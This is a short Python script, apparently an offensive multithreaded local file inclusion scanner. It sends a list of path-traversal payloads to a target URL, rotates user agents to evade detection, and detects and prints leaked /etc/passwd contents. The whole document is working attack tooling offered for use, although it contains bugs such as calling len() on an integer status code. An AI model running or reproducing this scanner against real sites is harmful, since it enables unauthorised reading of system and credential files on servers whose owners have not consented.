import requests, socket, sys, argparse, random, threading, OpenSSL,time
from bs4 import BeautifulSoup


LFI = [lfi.strip() for lfi in open("lfi.txt")]
USERAGENT = [agent.strip() for agent in open('user-agents.txt')]
zm = time.time()

CYAN = '\033[36m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
RED = '\033[31m'
ENDC = '\033[0m'



parse = argparse.ArgumentParser()
parse.add_argument('-u','--url',help='example: http://evil.com?file=')
args = parse.parse_args()
url = args.url


def output(put):
    file = open("output.txt","a+")
    file.writelines(str(put)+"\n")


# SCANNER DEF
say = 0
def scanner():
    global LFI
    global say
    global USERAGENT
    say += 1
    try:
        req = requests.get(url+LFI[say],headers={'User-Agent':random.choice(USERAGENT)})
        req_Text = req.text
        if "root:x" in req_Text:
            print(RED + "LFI BULUNDU ==>" + LFI[say]+BLUE)
            output(str("payload["+str(say)+"] "+LFI[say]))
            print(req_Text)

        else:
            pass

        print(req.url+" -- status_code:"+str(len(req.status_code))+"-- Lenght: "+str(len(req_Text)))
    except requests.exceptions.ConnectionError:
        pass
    except OpenSSL.SSL.Error:
        pass



# THREAD
thread = []
for thr in range(len(LFI)-1):
    t1 = threading.Thread(target=scanner)
    thread.append(t1)

for thr1 in thread:
    thr1.start()
    time.sleep(0.03)

for thr2 in thread:
    thr2.join()

zaman = time.time() - zm
print("Geçen süre: "+str(zaman))












